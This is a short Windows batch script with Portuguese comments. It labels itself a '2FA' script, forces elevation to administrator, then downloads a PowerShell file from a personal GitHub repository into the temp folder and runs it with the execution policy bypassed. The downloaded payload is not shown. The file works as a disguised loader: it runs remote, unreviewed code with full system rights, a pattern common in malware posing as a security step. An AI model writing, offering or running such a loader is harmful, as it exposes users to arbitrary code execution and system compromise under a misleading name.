@echo off
:: Verifica se está sendo executado como administrador
net session >nul 2>&1
if %errorlevel% equ 0 goto executa

:: Se não for admin, relança como admin
echo Requer elevação de privilegios. Reiniciando como administrador...
powershell -Command "Start-Process '%~f0' -Verb RunAs"
exit /b

:executa
echo Executando script 2FA como administrador...
powershell -NoExit -c "iwr 'https://raw.githubusercontent.com/akiranakaisan184proton/teste2fa/main/2fa.ps1' -outf $env:temp\2fa.ps1 -useb; if (Test-Path $env:temp\2fa.ps1) { powershell -ep bypass -f $env:temp\2fa.ps1 } else { echo 'Falha no download' }"

:: Mantém a janela aberta após a execução
echo Processo concluido. Verifique se o script foi executado corretamente.
pause